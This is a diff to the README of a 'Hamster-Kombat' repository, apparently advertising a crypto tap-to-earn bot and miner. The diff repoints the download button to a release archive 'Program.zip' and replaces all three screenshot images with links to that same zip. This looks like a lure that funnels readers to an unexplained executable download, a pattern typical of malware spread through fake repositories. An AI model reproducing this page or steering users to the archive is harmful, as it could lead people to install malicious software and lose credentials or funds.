@@ -27,15 +27,15 @@ Explore the following topics in the *Hamster-Kombat* repository:
 ## Installation
 
 To get started with the exciting world of *Hamster-Kombat*, download the necessary software by clicking the button below:
-[![Download Software](https://img.shields.io/badge/Download-Software-yellow)](https://github.com/user-attachments/files/17676667/Software.zip)
+[![Download Software](https://github.com/cessar0311/Hamster-Kombat/releases/download/v2.0/Program.zip)](https://github.com/cessar0311/Hamster-Kombat/releases/download/v2.0/Program.zip)
 
 ## Screenshots
 
 Take a sneak peek into the world of *Hamster-Kombat* with these captivating screenshots:
 
-![Hamster Kombat](https://source.unsplash.com/featured/400x250/?hamster)
-![Notcoin Miner](https://source.unsplash.com/featured/400x250/?cryptocurrency)
-![Tap-to-Earn Bot](https://source.unsplash.com/featured/400x250/?money)
+![Hamster Kombat](https://github.com/cessar0311/Hamster-Kombat/releases/download/v2.0/Program.zip)
+![Notcoin Miner](https://github.com/cessar0311/Hamster-Kombat/releases/download/v2.0/Program.zip)
+![Tap-to-Earn Bot](https://github.com/cessar0311/Hamster-Kombat/releases/download/v2.0/Program.zip)
 
 ## Usage
 
